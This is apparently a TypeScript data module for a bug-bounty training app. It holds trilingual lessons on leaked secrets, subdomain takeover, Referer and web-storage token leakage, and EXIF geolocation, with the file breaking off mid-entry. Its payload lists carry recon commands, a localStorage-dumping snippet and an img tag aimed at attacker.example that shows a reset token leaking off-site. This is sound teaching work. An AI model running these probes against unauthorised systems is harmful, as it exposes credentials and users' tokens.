import type { LearnGroup } from "@/learn/data/types";

// Advanced, P3/P4-focused group: the "quiet" disclosure bugs that recon surfaces.
// Each leaf is scored off Bugcrowd VRT release 2026-07-08. These rarely stand as
// P1/P2 on their own — the craft is recognising the leaked primitive, proving it
// with a single benign read, and knowing which variant tips the priority up.
export const infoExposureGroup: LearnGroup = {
  id: "info-exposure",
  name: "Sensitive Data Exposure",
  emoji: "🔓",
  blurb:
    "The recon tier: secrets, dangling DNS, token spillage, EXIF, verbose internals and spoofable mail. Mostly P3/P4 standalone — the money is in spotting the variant that escalates and proving it without touching real data.",
  topics: [
    {
      id: "disclosure-of-secrets",
      name: "Disclosure of Secrets",
      emoji: "🗝️",
      intro: {
        en: "A live credential (API/cloud key, DB connection string, signed token, private key block) reachable by an unauthorised party. The subtlety is asset classification: the same leaked key is P3 when it only exposes an internal/restricted asset (adjacent network, high attack complexity) and P1 the moment it is on a publicly accessible asset and still valid. Findability has shifted client-side — modern SPAs ship keys in webpack chunks, sourcemaps and inlined `.env` builds, and CI leaks them into public repos and Actions logs. The escalation edge is validity and blast radius: a verified-live key that calls a prod API is immediate provable access, which is why issuer-verifying scanners (not raw regex) are the signal that moves triage.",
        simple: "A live credential (API/cloud key, DB connection string, signed token, private key block) that an unauthorised person can reach. The key point is asset classification: the same leaked key is P3 when it only exposes an internal/restricted asset (adjacent network, high attack complexity) but P1 the moment it is on a publicly accessible asset and still valid. These days the leak is usually client-side — modern SPAs ship keys in webpack chunks, sourcemaps and inlined `.env` builds, and CI leaks them into public repos and Actions logs. What escalates it is validity and blast radius: a verified-live key that calls a prod API is instant provable access, which is why issuer-verifying scanners (not raw regex) are the signal triage trusts.",
        hi: "एक live credential (API/cloud key, DB connection string, signed token, private key block) जिस तक कोई unauthorised व्यक्ति पहुँच सके। असली बारीकी asset classification में है: वही leak हुई key P3 है जब वो सिर्फ़ किसी internal/restricted asset को expose करे (adjacent network, high attack complexity) और P1 उसी पल जब वो किसी publicly accessible asset पर हो और अब भी valid हो। आजकल leak ज़्यादातर client-side होता है — modern SPAs keys को webpack chunks, sourcemaps और inlined `.env` builds में भेज देते हैं, और CI इन्हें public repos तथा Actions logs में leak कर देता है। इसे escalate करने वाली बात है validity और blast radius: एक verified-live key जो किसी prod API को call करे, वह तुरंत साबित-योग्य access है, इसीलिए issuer-verifying scanners (न कि raw regex) वो signal हैं जिस पर triage भरोसा करता है।",
      },
      howToFind: [
        {
          title: {
            en: "Harvest from client bundles and recon surface",
            simple: "Harvest from client bundles and the recon surface",
            hi: "client bundles और recon surface से इकट्ठा करें",
          },
          steps: [
            {
              en: "Pull every JS/JSON chunk and sourcemap (katana/gau → httpx), then scan the directory — do not hand-roll credential regex one-liners.",
              simple: "Download every JS/JSON chunk and sourcemap (katana/gau → httpx), then scan the whole directory — don't write your own credential regex one-liners.",
              hi: "हर JS/JSON chunk और sourcemap download करें (katana/gau → httpx), फिर पूरी directory scan करें — अपने हाथ से credential regex one-liners न लिखें।",
            },
            {
              en: "Run an issuer-verifying scanner so you report only live keys: trufflehog --only-verified over the downloaded bundle dir, gitleaks over any cloned repo/history.",
              simple: "Run an issuer-verifying scanner so you only report live keys: trufflehog --only-verified over the downloaded bundle dir, gitleaks over any cloned repo/history.",
              hi: "एक issuer-verifying scanner चलाएँ ताकि आप सिर्फ़ live keys रिपोर्ट करें: downloaded bundle dir पर trufflehog --only-verified, किसी clone किए repo/history पर gitleaks।",
            },
            {
              en: "Probe for exposed config: .git/config, .env, .DS_Store, *.bak, appsettings.json, firebase config, and leaking Actions logs on the org's public repos.",
              simple: "Probe for exposed config: .git/config, .env, .DS_Store, *.bak, appsettings.json, firebase config, and leaking Actions logs on the org's public repos.",
              hi: "exposed config के लिए probe करें: .git/config, .env, .DS_Store, *.bak, appsettings.json, firebase config, और org के public repos पर leak होती Actions logs।",
            },
            {
              en: "Triage each hit by asset class first: is the thing it unlocks public (→ P1 path) or internal/restricted (→ P3)?",
              simple: "Triage each hit by asset class first: is what it unlocks public (→ P1 path) or internal/restricted (→ P3)?",
              hi: "हर hit को पहले asset class से triage करें: जो चीज़ यह खोलती है वो public है (→ P1 path) या internal/restricted (→ P3)?",
            },
          ],
        },
        {
          title: {
            en: "Prove validity with ONE read-only call",
            simple: "Prove it's live with ONE read-only call",
            hi: "एक read-only call से validity साबित करें",
          },
          steps: [
            {
              en: "Confirm the key is live with a single identity/metadata call and stop — never enumerate, list, or read customer data.",
              simple: "Confirm the key is live with a single identity/metadata call and stop — never enumerate, list, or read customer data.",
              hi: "key live है या नहीं यह एक identity/metadata call से confirm करें और रुक जाएँ — कभी enumerate, list, या customer data read न करें।",
            },
            {
              en: "AWS: aws sts get-caller-identity. GCP: tokeninfo. Stripe: GET /v1/balance. A 200 that returns the caller identity is sufficient proof.",
              simple: "AWS: aws sts get-caller-identity. GCP: tokeninfo. Stripe: GET /v1/balance. A 200 that returns the caller identity is enough proof.",
              hi: "AWS: aws sts get-caller-identity. GCP: tokeninfo. Stripe: GET /v1/balance. एक 200 जो caller identity लौटाए, काफ़ी सबूत है।",
            },
            {
              en: "Capture the request/response, the exact source location (file + line / commit), and whether the asset is public — then flag it to the user for rotation-urgency triage.",
              simple: "Capture the request/response, the exact source location (file + line / commit), and whether the asset is public — then flag it to the user so they can judge how urgently to rotate it.",
              hi: "request/response, exact source location (file + line / commit), और asset public है या नहीं यह capture करें — फिर इसे user को flag करें ताकि वो rotation-urgency तय कर सकें।",
            },
          ],
        },
      ],
      payloads: [
        "trufflehog filesystem ./js-bundles --only-verified --json   (report only issuer-verified, live keys)",
        "gitleaks detect --source . --redact --no-banner   (history + working tree, secrets redacted in output)",
        "nuclei -l hosts.txt -t http/exposures/ -t http/credentials/   (exposed .env/.git/config/token leaks)",
        "curl -s https://target/.git/config   (confirm a dangling repo exists before anything else)",
        "aws sts get-caller-identity   (ONE read-only call proves an AWS key is live — do NOT list/read resources)",
      ],
      example: {
        en: "A production SPA shipped a sourcemap that un-minified to a hardcoded internal analytics API key bound to a VPC-only host. trufflehog flagged it verified; a single identity call confirmed validity but the service was not internet-reachable, so it triaged P3 (internal asset, AV:A/AC:H). The same program later leaked a prod Stripe secret key in a public chunk — identical bug class, but a publicly accessible live key, scored P1.",
        simple: "A production SPA shipped a sourcemap that un-minified to a hardcoded internal analytics API key tied to a VPC-only host. trufflehog flagged it verified; a single identity call confirmed it was live, but the service wasn't reachable from the internet, so it triaged P3 (internal asset, AV:A/AC:H). The same program later leaked a prod Stripe secret key in a public chunk — same bug class, but a publicly accessible live key, scored P1.",
        hi: "एक production SPA ने एक sourcemap भेजा जो un-minify होकर एक hardcoded internal analytics API key दिखा गया जो एक VPC-only host से bound थी। trufflehog ने इसे verified flag किया; एक identity call ने live होना confirm किया पर service internet से reachable नहीं थी, तो यह P3 triage हुआ (internal asset, AV:A/AC:H)। उसी program ने बाद में एक prod Stripe secret key एक public chunk में leak की — वही bug class, पर एक publicly accessible live key, P1 score हुई।",
      },
      mapping: {
        bugcrowdVrt: "Sensitive Data Exposure › Disclosure of Secrets › For Internal Asset",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L",
        hackeroneCwe: "CWE-200: Exposure of Sensitive Information (and CWE-798: Use of Hard-coded Credentials)",
        cvssSeverity: "Medium (internal asset) → Critical/High",
        note: {
          en: "Lead case is the internal/restricted asset = P3 (AV:A/AC:H). The same bug is P1 for a publicly accessible asset with a live key (CVSS AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L). Invalid, sample, or intentionally-public keys = P5.",
          simple: "Main case is the internal/restricted asset = P3 (AV:A/AC:H). The same bug is P1 for a publicly accessible asset with a live key (CVSS AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L). Invalid, sample, or intentionally-public keys = P5.",
          hi: "मुख्य case है internal/restricted asset = P3 (AV:A/AC:H)। वही bug एक publicly accessible asset पर live key के साथ P1 है (CVSS AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L)। Invalid, sample, या जानबूझकर public keys = P5।",
        },
      },
      checklistCategoryId: "recon-js",
      references: [
        { label: "TruffleHog (issuer-verifying scanner)", url: "https://github.com/trufflesecurity/trufflehog" },
        { label: "PortSwigger: Information disclosure", url: "https://portswigger.net/web-security/information-disclosure" },
      ],
    },
    {
      id: "subdomain-takeover",
      name: "Subdomain Takeover",
      emoji: "🏚️",
      intro: {
        en: "A subdomain's DNS record (usually a CNAME, sometimes an A/NS/MX) points at a third-party service whose resource has been de-provisioned but whose DNS was never cleaned up — a dangling pointer. Claiming that resource at the provider lets you serve content on the target's own trusted hostname. Standalone it is a P3 (low confidentiality/integrity, no data), but the real value is the trust the hostname carries: it is the classic improper-access-control primitive that chains into cookie theft (cookies scoped to `*.target.com`), OAuth redirect_uri allowlist abuse, CSP `script-src` allowlisting, and convincing phishing. The subtle findability is that many fingerprints only show under exact host headers or on fresh NXDOMAIN/404 states, so a single resolver pass misses them.",
        simple: "A subdomain's DNS record (usually a CNAME, sometimes an A/NS/MX) points at a third-party service whose resource was removed but whose DNS was never cleaned up — a dangling pointer. Claiming that resource at the provider lets you serve content on the target's own trusted hostname. On its own it's a P3 (low confidentiality/integrity, no data), but the real value is the trust the hostname carries: it's the classic improper-access-control primitive that chains into cookie theft (cookies scoped to `*.target.com`), OAuth redirect_uri allowlist abuse, CSP `script-src` allowlisting, and convincing phishing. The catch is that many fingerprints only show under exact host headers or on fresh NXDOMAIN/404 states, so a single resolver pass misses them.",
        hi: "एक subdomain का DNS record (आम तौर पर CNAME, कभी A/NS/MX) किसी third-party service की ओर इशारा करता है जिसका resource तो हटा दिया गया पर जिसका DNS कभी साफ़ नहीं किया गया — एक dangling pointer। उस resource को provider पर claim करने से आप target के अपने trusted hostname पर content serve कर सकते हैं। अकेला यह P3 है (low confidentiality/integrity, कोई data नहीं), पर असली क़ीमत उस भरोसे में है जो hostname रखता है: यह classic improper-access-control primitive है जो cookie theft (`*.target.com` scoped cookies), OAuth redirect_uri allowlist abuse, CSP `script-src` allowlisting, और भरोसेमंद phishing में chain होता है। असली बारीकी यह है कि कई fingerprints सिर्फ़ exact host headers पर या fresh NXDOMAIN/404 states पर ही दिखते हैं, तो एक ही resolver pass इन्हें छोड़ देता है।",
      },
      howToFind: [
        {
          title: {
            en: "Enumerate and resolve for dangling pointers",
            simple: "Enumerate and resolve to find dangling pointers",
            hi: "dangling pointers के लिए enumerate और resolve करें",
          },
          steps: [
            {
              en: "Build the widest subdomain list you can (subfinder -all + CT logs + wayback), then resolve CNAMEs: dnsx -cname -resp-only.",
              simple: "Build the widest subdomain list you can (subfinder -all + CT logs + wayback), then resolve the CNAMEs: dnsx -cname -resp-only.",
              hi: "जितनी चौड़ी हो सके उतनी subdomain list बनाएँ (subfinder -all + CT logs + wayback), फिर CNAMEs resolve करें: dnsx -cname -resp-only।",
            },
            {
              en: "Flag pointers at takeover-prone providers (S3, GitHub/GitLab Pages, Heroku, Azure, Fastly, Shopify, Zendesk, Netlify, Surge) and NXDOMAIN/unclaimed states.",
              simple: "Flag pointers at takeover-prone providers (S3, GitHub/GitLab Pages, Heroku, Azure, Fastly, Shopify, Zendesk, Netlify, Surge) and NXDOMAIN/unclaimed states.",
              hi: "takeover-prone providers (S3, GitHub/GitLab Pages, Heroku, Azure, Fastly, Shopify, Zendesk, Netlify, Surge) और NXDOMAIN/unclaimed states वाले pointers flag करें।",
            },
            {
              en: "Match provider fingerprints with dnsReaper (best signal, active edge-case checks), nuclei http/takeovers templates, or subjack as a fast Go fallback.",
              simple: "Match provider fingerprints with dnsReaper (best signal, active edge-case checks), nuclei http/takeovers templates, or subjack as a fast Go fallback.",
              hi: "provider fingerprints match करें dnsReaper से (सबसे अच्छा signal, active edge-case checks), nuclei http/takeovers templates, या तेज़ Go fallback के तौर पर subjack।",
            },
            {
              en: "Cross-reference EdOverflow's can-i-take-over-xyz to confirm the service is actually claimable (some return a takeover-looking banner but are not exploitable).",
              simple: "Cross-check EdOverflow's can-i-take-over-xyz to confirm the service is actually claimable (some show a takeover-looking banner but can't be exploited).",
              hi: "EdOverflow के can-i-take-over-xyz से cross-check करें ताकि पक्का हो कि service सच में claim हो सकती है (कुछ takeover जैसा banner दिखाते हैं पर exploit नहीं हो सकते)।",
            },
          ],
        },
        {
          title: {
            en: "Prove safely, in scope only",
            simple: "Prove it safely, in scope only",
            hi: "सुरक्षित तरीक़े से साबित करें, सिर्फ़ scope में",
          },
          steps: [
            {
              en: "If the program permits claiming: register the resource and serve a single unique text marker (e.g. a UUID in a .txt) — never host a real login page or phishing content.",
              simple: "If the program allows claiming: register the resource and serve a single unique text marker (e.g. a UUID in a .txt) — never host a real login page or phishing content.",
              hi: "अगर program claim करने की इजाज़त दे: resource register करें और एक अकेला unique text marker serve करें (जैसे किसी .txt में एक UUID) — कभी असली login page या phishing content host न करें।",
            },
            {
              en: "If claiming is out of scope: report the dangling record + the provider fingerprint response as proof; do not claim.",
              simple: "If claiming is out of scope: report the dangling record plus the provider fingerprint response as proof; do not claim it.",
              hi: "अगर claim करना out of scope है: dangling record और provider fingerprint response को सबूत के तौर पर रिपोर्ट करें; claim न करें।",
            },
            {
              en: "Note any chain multiplier in the report — is the host in an OAuth redirect allowlist, a CSP source, or a cookie domain? That is what lifts it above P3.",
              simple: "Note any chain multiplier in the report — is the host in an OAuth redirect allowlist, a CSP source, or a cookie domain? That is what lifts it above P3.",
              hi: "रिपोर्ट में कोई chain multiplier नोट करें — क्या host किसी OAuth redirect allowlist, CSP source, या cookie domain में है? यही इसे P3 से ऊपर ले जाता है।",
            },
          ],
        },
      ],
      payloads: [
        "subfinder -d target.com -all -silent | dnsx -cname -resp-only | sort -u   (map every CNAME)",
        "dnsReaper single --domain assets.target.com   (provider fingerprints + active checks)",
        "nuclei -l subs.txt -t http/takeovers/   (fingerprint dangling providers at scale)",
        "subjack -w subs.txt -ssl -c fingerprints.json   (fast fallback)",
        "dig +short assets.target.com CNAME   (manual confirm of the dangling target)",
      ],
      example: {
        en: "assets.target.com CNAME'd to an S3 bucket that returned NoSuchBucket. The region was recoverable from the fingerprint, the bucket name was free, and claiming it let the hunter serve a UUID marker on the target's own subdomain — P3 on its own. It escalated when assets.target.com turned out to be in the SSO provider's redirect_uri allowlist, turning the takeover into an OAuth authorization-code theft path.",
        simple: "assets.target.com had a CNAME to an S3 bucket that returned NoSuchBucket. The region was recoverable from the fingerprint, the bucket name was free, and claiming it let the hunter serve a UUID marker on the target's own subdomain — P3 on its own. It escalated when assets.target.com turned out to be in the SSO provider's redirect_uri allowlist, turning the takeover into an OAuth authorization-code theft path.",
        hi: "assets.target.com का CNAME एक S3 bucket पर था जो NoSuchBucket लौटाता था। region fingerprint से मिल गया, bucket name खाली था, और इसे claim करने से hunter target के अपने subdomain पर एक UUID marker serve कर पाया — अकेला यह P3। यह तब escalate हुआ जब पता चला कि assets.target.com SSO provider के redirect_uri allowlist में है, जिससे takeover एक OAuth authorization-code theft path बन गया।",
      },
      mapping: {
        bugcrowdVrt: "Server Security Misconfiguration › Misconfigured DNS › Subdomain Takeover",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        hackeroneCwe: "CWE-284: Improper Access Control (dangling DNS / takeover)",
        cvssSeverity: "Medium (higher when chained to cookie scope / OAuth redirect / CSP)",
        note: {
          en: "P3 standalone. A base-domain or MX/NS takeover, or one that cookies/OAuth/CSP trust, pushes impact up toward P1/P2 — score follows what the trusted hostname unlocks, not the takeover itself.",
          simple: "P3 on its own. A base-domain or MX/NS takeover, or one that cookies/OAuth/CSP trust, pushes impact up toward P1/P2 — the score follows what the trusted hostname unlocks, not the takeover itself.",
          hi: "अकेला P3। एक base-domain या MX/NS takeover, या ऐसा जिस पर cookies/OAuth/CSP भरोसा करें, impact को P1/P2 की ओर धकेल देता है — score इस पर निर्भर है कि trusted hostname क्या खोलता है, न कि takeover पर।",
        },
      },
      checklistCategoryId: "recon-subdomain",
      references: [
        { label: "can-i-take-over-xyz (fingerprint matrix)", url: "https://github.com/EdOverflow/can-i-take-over-xyz" },
        { label: "dnsReaper", url: "https://github.com/punk-security/dnsReaper" },
      ],
    },
    {
      id: "token-leakage",
      name: "Token Leakage (Referer & Web Storage)",
      emoji: "📤",
      intro: {
        en: "Sensitive tokens that spill out of their intended boundary: a secret placed in a URL query string leaks cross-site via the Referer header to untrusted third parties (analytics, ad pixels, CDN assets) whenever Referrer-Policy is unsafe; and bearer/session/reset tokens parked in localStorage or sessionStorage are reachable by any script in the origin. Both are high-attack-complexity P4s — the leak is real but needs a specific condition (a loaded 3rd-party resource, or an XSS/dependency to read storage). The escalation edge is what the token is: a leaked CSRF nonce or non-sensitive id stays P4/P5, but a leaked session/bearer or single-use reset token is a direct account-takeover primitive and is scored far higher. Findability is cheap and almost always skipped — it is one DevTools inventory and one header check.",
        simple: "Sensitive tokens that leak out of where they belong: a secret placed in a URL query string leaks cross-site via the Referer header to untrusted third parties (analytics, ad pixels, CDN assets) whenever Referrer-Policy is unsafe; and bearer/session/reset tokens kept in localStorage or sessionStorage can be read by any script in the origin. Both are high-attack-complexity P4s — the leak is real but needs a specific condition (a loaded 3rd-party resource, or an XSS/dependency to read storage). What escalates it is what the token is: a leaked CSRF nonce or non-sensitive id stays P4/P5, but a leaked session/bearer or single-use reset token is a direct account-takeover primitive and scores far higher. It's cheap to check and almost always skipped — one DevTools inventory and one header check.",
        hi: "ऐसे sensitive tokens जो अपनी तय सीमा से बाहर रिस जाते हैं: एक URL query string में रखा secret, जब भी Referrer-Policy असुरक्षित हो, Referer header के ज़रिए untrusted third parties (analytics, ad pixels, CDN assets) को cross-site leak हो जाता है; और localStorage या sessionStorage में रखे bearer/session/reset tokens को origin का कोई भी script पढ़ सकता है। दोनों high-attack-complexity P4 हैं — leak असली है पर इसके लिए एक ख़ास शर्त चाहिए (कोई load होता 3rd-party resource, या storage पढ़ने के लिए कोई XSS/dependency)। इसे escalate करने वाली बात है कि token क्या है: एक leak हुआ CSRF nonce या non-sensitive id P4/P5 ही रहता है, पर एक leak हुआ session/bearer या single-use reset token सीधा account-takeover primitive है और कहीं ज़्यादा score करता है। इसे check करना सस्ता है और लगभग हमेशा छोड़ दिया जाता है — एक DevTools inventory और एक header check।",
      },
      howToFind: [
        {
          title: {
            en: "Inventory web storage (read-only)",
            simple: "Inventory web storage (read-only)",
            hi: "web storage का inventory लें (read-only)",
          },
          steps: [
            {
              en: "In DevTools console, enumerate what the SPA persisted and classify each key: is it a session/bearer/refresh/reset token, or harmless UI state?",
              simple: "In the DevTools console, list what the SPA stored and classify each key: is it a session/bearer/refresh/reset token, or harmless UI state?",
              hi: "DevTools console में, SPA ने जो कुछ store किया है उसे list करें और हर key को classify करें: क्या यह session/bearer/refresh/reset token है, या सिर्फ़ harmless UI state?",
            },
            {
              en: "Check whether storage survives logout and whether the same value is also sent as an auth header — that confirms it is a live session primitive, not a copy.",
              simple: "Check whether storage survives logout and whether the same value is also sent as an auth header — that confirms it's a live session primitive, not just a copy.",
              hi: "देखें कि storage logout के बाद भी टिकता है और क्या वही value एक auth header के तौर पर भी भेजी जाती है — इससे पक्का होता है कि यह एक live session primitive है, महज़ copy नहीं।",
            },
            {
              en: "Pair with the XSS surface: a sensitive token in localStorage turns any origin-scoped XSS into instant ATO, so note the chain even if you cannot read it yet.",
              simple: "Pair it with the XSS surface: a sensitive token in localStorage turns any origin-scoped XSS into instant ATO, so note the chain even if you can't read it yet.",
              hi: "इसे XSS surface के साथ जोड़ें: localStorage में एक sensitive token किसी भी origin-scoped XSS को तुरंत ATO बना देता है, तो chain नोट करें भले ही आप अभी इसे पढ़ न सकें।",
            },
          ],
        },
        {
          title: {
            en: "Hunt Referer spillage",
            simple: "Hunt Referer spillage",
            hi: "Referer spillage ढूँढें",
          },
          steps: [
            {
              en: "Find tokens placed in URLs: password-reset links, email-verification, magic-login, SAML/OAuth parameters, share links.",
              simple: "Find tokens placed in URLs: password-reset links, email-verification, magic-login, SAML/OAuth parameters, share links.",
              hi: "URLs में रखे tokens ढूँढें: password-reset links, email-verification, magic-login, SAML/OAuth parameters, share links।",
            },
            {
              en: "Check Referrer-Policy on the page serving that URL — absent or unsafe-url/no-referrer-when-downgrade means the full URL (token included) leaks on every outbound request.",
              simple: "Check Referrer-Policy on the page serving that URL — if it's absent or set to unsafe-url/no-referrer-when-downgrade, the full URL (token included) leaks on every outbound request.",
              hi: "उस URL को serve करने वाले page पर Referrer-Policy check करें — इसका न होना या unsafe-url/no-referrer-when-downgrade होना मतलब पूरा URL (token समेत) हर outbound request पर leak होता है।",
            },
            {
              en: "Prove it: load a page whose URL holds the token and that references any off-domain resource; capture the Referer header arriving at the third party carrying the token.",
              simple: "Prove it: load a page whose URL holds the token and that loads any off-domain resource; capture the Referer header that reaches the third party carrying the token.",
              hi: "इसे साबित करें: एक ऐसा page load करें जिसके URL में token हो और जो किसी off-domain resource को reference करे; उस Referer header को capture करें जो third party तक token लेकर पहुँचता है।",
            },
          ],
        },
      ],
      payloads: [
        "Object.keys(localStorage).forEach(k => console.log(k, localStorage.getItem(k)));   // DevTools: inventory persisted secrets",
        "Object.keys(sessionStorage).forEach(k => console.log(k, sessionStorage.getItem(k)));",
        "curl -sI https://app.target.com/reset | grep -i referrer-policy   (absent/unsafe-url => query-string tokens leak)",
        "<img src=\"https://attacker.example/pixel.png\">   (placed on a page whose URL holds ?token=... — Referer carries it off-site)",
      ],
      example: {
        en: "A password-reset link put the single-use token in the query string, and the reset page loaded a third-party analytics script with Referrer-Policy: unsafe-url. The full reset URL — token and all — arrived in the analytics vendor's Referer logs. Standalone the storage/referer class is P4; because the leaked value was a reset token (account-takeover primitive handed to an untrusted third party), triage treated it well above the baseline.",
        simple: "A password-reset link put the single-use token in the query string, and the reset page loaded a third-party analytics script with Referrer-Policy: unsafe-url. The full reset URL — token and all — arrived in the analytics vendor's Referer logs. On its own the storage/referer class is P4; because the leaked value was a reset token (an account-takeover primitive handed to an untrusted third party), triage treated it well above the baseline.",
        hi: "एक password-reset link ने single-use token को query string में रखा, और reset page ने Referrer-Policy: unsafe-url के साथ एक third-party analytics script load की। पूरा reset URL — token समेत — analytics vendor की Referer logs में पहुँच गया। अकेले यह storage/referer class P4 है; चूँकि leak हुई value एक reset token थी (एक untrusted third party को दिया गया account-takeover primitive), triage ने इसे baseline से काफ़ी ऊपर माना।",
      },
      mapping: {
        bugcrowdVrt: "Sensitive Data Exposure › Token Leakage via Referer › Untrusted 3rd Party",
        bugcrowdPriority: "P4",
        bugcrowdCvss: "AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N",
        hackeroneCwe: "CWE-200: Exposure of Sensitive Information (and CWE-922: Insecure Storage of Sensitive Information)",
        cvssSeverity: "Low (→ High if the leaked token enables account takeover)",
        note: {
          en: "Both variants are P4: Referer leak to untrusted 3rd party, and a sensitive token in localStorage/sessionStorage (CVSS AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N). A non-sensitive token = P5; a live session/bearer/reset token escalates well beyond Low.",
          simple: "Both variants are P4: a Referer leak to an untrusted 3rd party, and a sensitive token in localStorage/sessionStorage (CVSS AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N). A non-sensitive token = P5; a live session/bearer/reset token goes well beyond Low.",
          hi: "दोनों variants P4 हैं: एक untrusted 3rd party को Referer leak, और localStorage/sessionStorage में एक sensitive token (CVSS AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)। एक non-sensitive token = P5; एक live session/bearer/reset token Low से कहीं आगे चला जाता है।",
        },
      },
      checklistCategoryId: "recon-js",
      references: [
        { label: "MDN: Referrer-Policy", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy" },
        { label: "OWASP WSTG: Web Storage", url: "https://owasp.org/www-project-web-security-testing-guide/" },
      ],
    },
    {
      id: "exif-geolocation",
      name: "EXIF Geolocation Not Stripped",
      emoji: "📍",
      intro: {
        en: "An upload pipeline that serves user images without re-encoding leaves the original EXIF metadata intact — GPS latitude/longitude, capture timestamps, device make/model and sometimes owner name. The privacy leak itself is modest, but Bugcrowd splits it on enumerability: if you can map any image URL back to the user who posted it programmatically (predictable/sequential filenames, an API that returns the uploader), it is automatic user enumeration and scored P3; if correlating an image to a user needs manual effort, it drops to P4. The subtle findability is that the bug only exists when the server does NOT transcode — so the test is whether the bytes you download still carry the tags you uploaded.",
        simple: "An upload pipeline that serves user images without re-encoding leaves the original EXIF metadata intact — GPS latitude/longitude, capture timestamps, device make/model and sometimes owner name. The privacy leak itself is small, but Bugcrowd splits it on enumerability: if you can map any image URL back to the user who posted it automatically (predictable/sequential filenames, an API that returns the uploader), it's automatic user enumeration and scored P3; if linking an image to a user needs manual effort, it drops to P4. The catch is the bug only exists when the server does NOT transcode — so the test is whether the bytes you download still carry the tags you uploaded.",
        hi: "एक upload pipeline जो user images को बिना re-encode किए serve करती है, original EXIF metadata ज्यों-का-त्यों छोड़ देती है — GPS latitude/longitude, capture timestamps, device make/model और कभी owner name। privacy leak अपने आप में छोटा है, पर Bugcrowd इसे enumerability पर बाँटता है: अगर आप किसी image URL को programmatically वापस उस user से map कर सकें जिसने उसे post किया (predictable/sequential filenames, एक API जो uploader लौटाए), तो यह automatic user enumeration है और P3 score होता है; अगर image को user से जोड़ने के लिए manual मेहनत चाहिए, तो यह P4 पर गिर जाता है। असली बारीकी यह है कि bug सिर्फ़ तब मौजूद होता है जब server transcode नहीं करता — तो test यह है कि आपके download किए bytes अब भी वही tags रखते हैं या नहीं जो आपने upload किए थे।",
      },
      howToFind: [
        {
          title: {
            en: "Confirm metadata survives the pipeline",
            simple: "Confirm the metadata survives the pipeline",
            hi: "पक्का करें कि metadata pipeline में बच जाता है",
          },
          steps: [
            {
              en: "Upload a test image containing known GPS + device tags, then download the served copy and diff the metadata with exiftool — if GPS survives, the pipeline isn't stripping.",
              simple: "Upload a test image with known GPS + device tags, then download the served copy and compare the metadata with exiftool — if GPS survives, the pipeline isn't stripping it.",
              hi: "एक test image upload करें जिसमें ज्ञात GPS + device tags हों, फिर serve हुई copy download करके exiftool से metadata compare करें — अगर GPS बच जाए तो pipeline strip नहीं कर रही।",
            },
            {
              en: "Also check thumbnails/resized variants and any CDN copy separately; sometimes the display size is stripped but an original/download endpoint is not.",
              simple: "Also check thumbnails/resized versions and any CDN copy separately; sometimes the display size is stripped but an original/download endpoint isn't.",
              hi: "thumbnails/resized variants और कोई भी CDN copy अलग से भी check करें; कभी display size strip होता है पर कोई original/download endpoint नहीं।",
            },
          ],
        },
        {
          title: {
            en: "Decide automatic vs manual enumeration",
            simple: "Decide automatic vs manual enumeration",
            hi: "तय करें: automatic या manual enumeration",
          },
          steps: [
            {
              en: "Look at how image URLs/filenames are formed: sequential ids, UUIDs that leak in a list API, or a user-id in the path all enable automatic correlation (→ P3).",
              simple: "Look at how image URLs/filenames are formed: sequential ids, UUIDs that leak in a list API, or a user-id in the path all allow automatic correlation (→ P3).",
              hi: "देखें कि image URLs/filenames कैसे बनते हैं: sequential ids, किसी list API में leak होते UUIDs, या path में एक user-id — ये सब automatic correlation करा देते हैं (→ P3)।",
            },
            {
              en: "Pull EXIF from real in-scope uploads only to the extent needed to prove location data is present — do not harvest or aggregate users' personal locations.",
              simple: "Pull EXIF from real in-scope uploads only as far as needed to prove location data is present — don't harvest or aggregate users' personal locations.",
              hi: "असली in-scope uploads से EXIF सिर्फ़ उतना निकालें जितना location data मौजूद साबित करने के लिए ज़रूरी हो — users की personal locations इकट्ठा या aggregate न करें।",
            },
            {
              en: "Report the leak + whether image→user mapping is automatable; that single fact is what sets P3 vs P4.",
              simple: "Report the leak plus whether image→user mapping can be automated; that one fact sets P3 vs P4.",
              hi: "leak रिपोर्ट करें और यह भी कि image→user mapping automate हो सकती है या नहीं; यही एक बात P3 बनाम P4 तय करती है।",
            },
          ],
        },
      ],
      payloads: [
        "exiftool -gps:all -City -State -Make -Model served-image.jpg   (does location survive the server?)",
        "exiftool -json -n image.jpg | jq '{GPSLatitude,GPSLongitude,CreateDate,Make,Model}'",
        "curl -s https://cdn.target.com/u/1001/avatar.jpg -o /tmp/a.jpg && exiftool -GPSPosition /tmp/a.jpg   (sequential id = auto-enum)",
      ],
      example: {
        en: "A social feature served uploaded photos at /media/<sequential-id>.jpg with no re-encoding. exiftool on the downloaded bytes showed intact GPSPosition tags, and because the id was sequential and an adjacent API returned the uploader for each id, any image could be mapped to a user automatically — automatic user enumeration, P3. Had the mapping required manual OSINT, it would have been P4.",
        simple: "A social feature served uploaded photos at /media/<sequential-id>.jpg with no re-encoding. exiftool on the downloaded bytes showed intact GPSPosition tags, and because the id was sequential and a nearby API returned the uploader for each id, any image could be mapped to a user automatically — automatic user enumeration, P3. Had the mapping needed manual OSINT, it would have been P4.",
        hi: "एक social feature upload की गई photos को /media/<sequential-id>.jpg पर बिना re-encode किए serve करता था। download किए bytes पर exiftool ने GPSPosition tags ज्यों-के-त्यों दिखाए, और चूँकि id sequential थी और पास की एक API हर id के लिए uploader लौटाती थी, किसी भी image को automatically एक user से map किया जा सकता था — automatic user enumeration, P3। अगर mapping के लिए manual OSINT चाहिए होता, तो यह P4 होता।",
      },
      mapping: {
        bugcrowdVrt:
          "Sensitive Data Exposure › EXIF Geolocation Data Not Stripped From Uploaded Images › Automatic User Enumeration",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        hackeroneCwe: "CWE-200: Exposure of Sensitive Information",
